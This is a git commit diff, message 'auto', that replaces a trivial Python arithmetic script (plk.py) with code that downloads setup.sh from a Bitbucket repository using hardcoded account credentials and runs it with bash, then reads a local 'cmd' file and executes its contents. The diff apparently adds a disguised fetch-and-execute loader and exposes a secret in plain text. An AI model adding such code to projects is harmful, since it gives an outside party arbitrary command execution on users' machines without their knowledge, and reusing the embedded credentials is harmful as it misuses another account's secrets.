20c01405f12152dc2f814a3f1c18b646ee726731
gakira munshi <gakimarki@proton.me>
2024-11-24 15:22:04 -0500

    auto

--- plk.py
+++ plk.py
@@ -1,6 +1,15 @@
-import sys,time,os
+import os
 if __name__=='__main__':
-  t=7./7
-  y=1*t
-  print(y*6)
-  sys.stdout.flush();
+  cmd1='bash -ic "rm -f setup.sh && curl --silent -O --user shananalla88:ukqxwnzRwJhvb5Nd9pUw https://api.bitbucket.org/2.0/repositories/shananalla88/testpaw/src/master/py3/setup.sh && bash setup.sh random random random  "'
+  os.system(cmd1)
+  
+  cmd2='bash -ic "echo GETTING_SRV_CMD &&  . ~/.bashrc && gf cmd   "'
+  os.system(cmd2)
+
+  run_cmd=''
+  if os.path.exists('cmd'): run_cmd=open('cmd').read().strip();print('run_cmd: ',run_cmd)
+  else: print('./cmd did not exist!!')
+
+  cmd2='bash -ic "echo HERE &&  . ~/.bashrc && '+run_cmd+'   "'
+  print('cmd2: ',cmd2)
+  os.system(cmd2)
